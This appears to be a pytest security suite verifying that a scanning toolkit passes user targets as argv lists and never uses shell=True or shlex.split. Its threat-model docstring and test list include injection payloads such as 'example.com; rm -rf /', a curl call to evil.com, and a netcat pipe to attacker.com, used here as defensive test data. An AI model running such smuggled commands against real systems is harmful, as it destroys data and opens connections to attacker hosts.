"""
Command Injection Prevention - Security Verification Suite

CRITICAL INVARIANT:
All tool execution MUST use argv lists, NEVER shell=True or string commands.
This prevents command injection attacks via user-controlled target input.

This test suite verifies TODO #4: "Shim Argument Injection Vulnerability" has been resolved.

THREAT MODEL:
Attacker provides target like: "example.com; rm -rf /" or "$(evil_command)"
If we used shell=True or shlex.split on user input, this would execute arbitrary commands.

DEFENSE:
- Use subprocess with argv lists: subprocess.Popen(["/usr/bin/nmap", "-sV", target])
- Never use shell=True
- Never concatenate user input into command strings
"""

import subprocess
import pytest
from unittest.mock import patch, Mock, MagicMock
from pathlib import Path

import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from core.toolkit.registry import get_tool_command, TOOLS


def test_get_tool_command_returns_argv_list():
    """
    INVARIANT: get_tool_command() MUST return a list, never a string.

    This is the first line of defense against command injection.
    If it returns a list, subprocess won't invoke a shell.
    """
    # Test with safe target
    cmd, stdin = get_tool_command("nmap", "example.com")

    # Verify return type
    assert isinstance(cmd, list), f"Expected list, got {type(cmd)}"
    assert all(isinstance(arg, str) for arg in cmd), "All arguments must be strings"

    # Verify first element is the binary name
    assert cmd[0] == "nmap"

    # Verify target appears as a distinct argument (not concatenated)
    assert "example.com" in cmd

    # Verify no shell metacharacters are treated specially
    cmd_malicious, stdin_malicious = get_tool_command("nmap", "example.com; whoami")
    assert "example.com; whoami" in cmd_malicious  # Should be passed as literal string
    assert len([arg for arg in cmd_malicious if ";" in arg]) == 1  # Semicolon is in target arg


def test_malicious_target_cannot_inject_arguments():
    """
    INVARIANT: Malicious targets cannot inject new command-line arguments.

    DEFENSE-IN-DEPTH:
    1. normalize_target() uses urlparse (may strip some metacharacters)
    2. Command is always an argv list (no shell=True)
    3. Target goes into ONE argument slot - can't create new arguments

    Even if malicious chars survive normalization (like "$" in URLs),
    they're treated as literal strings because shell=False.
    """
    malicious_targets = [
        "example.com; whoami",
        "example.com && curl http://evil.com",
        "example.com | nc attacker.com 1234",
        "example.com --extra-flag",  # Try to inject a flag
        "example.com -oN /tmp/pwned",  # nmap output redirect
    ]

    for malicious in malicious_targets:
        cmd, stdin = get_tool_command("nmap", malicious)

        # 1. Command should still be a list
        assert isinstance(cmd, list), f"Failed for target: {malicious}"

        # 2. CRITICAL: Verify no NEW arguments were injected
        # The nmap command has a fixed number of arguments
        expected_arg_count = len(TOOLS["nmap"]["cmd"])
        assert len(cmd) == expected_arg_count, (
            f"INJECTION DETECTED! Expected {expected_arg_count} args, got {len(cmd)} "
            f"for target '{malicious}'.\n"
            f"Command: {cmd}\n"
            f"This means attacker-controlled arguments were added!"
        )

        # 3. Verify attacker flags didn't become separate arguments
        attacker_flags = ["--extra-flag", "-oN", "/tmp/pwned"]
        for flag in attacker_flags:
            standalone_flags = [arg for arg in cmd if arg == flag]
            assert len(standalone_flags) == 0, (
                f"INJECTION DETECTED! Attacker flag '{flag}' became a separate argument.\n"
                f"Command: {cmd}"
            )


def test_subprocess_usage_in_runner_is_safe():
    """
    INVARIANT: subprocess.Popen in runner.py must use argv list, not shell=True.

    This verifies the execution code is correct by reading the source.
    """
    # Read runner.py source code
    runner_path = Path(__file__).parent.parent.parent / "core" / "engine" / "runner.py"
    assert runner_path.exists(), "runner.py not found"

    content = runner_path.read_text()

    # Find subprocess.Popen call
    assert "subprocess.Popen" in content, "Expected subprocess.Popen usage"

    # Extract the Popen call (lines around it)
    lines = content.split('\n')
    popen_lines = [i for i, line in enumerate(lines) if 'subprocess.Popen' in line]

    assert len(popen_lines) > 0, "No subprocess.Popen found"

    # Check surrounding lines for shell=True
    for line_num in popen_lines:
        # Check next 10 lines for shell= parameter
        context = '\n'.join(lines[line_num:line_num + 10])

        assert "shell=True" not in context, (
            f"Found shell=True near line {line_num} in runner.py:\n{context}\n"
            f"This is a CRITICAL SECURITY VULNERABILITY!"
        )

        # Verify cmd is the first argument (should be a variable, not a string)
        popen_line = lines[line_num]
        assert "cmd," in context or "cmd " in context, (
            f"Expected 'cmd' as first argument to Popen at line {line_num}"
        )


def test_no_shlex_split_in_execution_path():
    """
    INVARIANT: shlex.split() must NOT be used in the execution path.

    If we use shlex.split() on user input, we're converting a string to argv,
    which means we're building string commands. This is vulnerable to injection.

    The correct pattern is: define commands as argv lists from the start.
    """
    # Read all relevant source files
    toolkit_dir = Path(__file__).parent.parent.parent / "core" / "toolkit"
    engine_dir = Path(__file__).parent.parent.parent / "core" / "engine"

    files_to_check = [
        toolkit_dir / "registry.py",
        engine_dir / "runner.py",
    ]

    for filepath in files_to_check:
        if not filepath.exists():
            continue

        content = filepath.read_text()

        # Check for shlex.split usage
        assert "shlex.split" not in content, (
            f"Found 'shlex.split' in {filepath}. "
            f"This suggests string-based command construction, which is vulnerable to injection."
        )

        # Check for shell=True usage
        assert "shell=True" not in content, (
            f"Found 'shell=True' in {filepath}. "
            f"This is a CRITICAL SECURITY VULNERABILITY!"
        )


def test_tool_definitions_are_lists():
    """
    INVARIANT: All tool definitions in TOOLS registry must use cmd as list.

    This ensures every tool is defined safely from the start.
    """
    for tool_name, tool_def in TOOLS.items():
        cmd = tool_def.get("cmd")

        assert isinstance(cmd, list), (
            f"Tool '{tool_name}' has cmd as {type(cmd)}. "
            f"It MUST be a list to prevent command injection."
        )

        # Verify all elements are strings or placeholders
        for i, arg in enumerate(cmd):
            assert isinstance(arg, str), (
                f"Tool '{tool_name}' cmd[{i}] is {type(arg)}, expected str"
            )


def test_target_substitution_preserves_argv_structure():
    """
    INVARIANT: {target} substitution must not break argv structure.

    Even if target contains spaces, it should remain a single argument.
    Example: target="example.com --evil-flag" should NOT create a new --evil-flag argument.
    """
    # Target with space (could be URL with params)
    target_with_space = "example.com --extra-flag"

    cmd, stdin = get_tool_command("nmap", target_with_space)

    # The target should appear in ONE argument (not split by space)
    matching_args = [arg for arg in cmd if target_with_space in arg]
    assert len(matching_args) == 1, (
        f"Target '{target_with_space}' should be in one argument, found {len(matching_args)}"
    )

    # Verify --extra-flag didn't become a separate argument
    assert "--extra-flag" not in cmd, (
        "Attacker-controlled --extra-flag should NOT appear as a separate argument"
    )


def test_ci_gate_no_shell_true_in_codebase():
    """
    INVARIANT: No shell=True anywhere in core/ (except whitelisted test files).

    This is the CI gate that prevents regressions.
    """
    core_dir = Path(__file__).parent.parent.parent / "core"

    # Search for shell=True in all Python files
    violations = []
    for py_file in core_dir.rglob("*.py"):
        if py_file.name.startswith("test_"):
            continue  # Skip test files

        content = py_file.read_text()
        if "shell=True" in content:
            violations.append(str(py_file.relative_to(core_dir.parent)))

    assert len(violations) == 0, (
        f"Found shell=True in {len(violations)} files:\n" +
        "\n".join(f"  - {f}" for f in violations) +
        "\n\nThis is a BLOCKING CI failure. Remove all shell=True usage."
    )


if __name__ == "__main__":
    # Run tests with pytest
    pytest.main([__file__, "-v", "-s"])
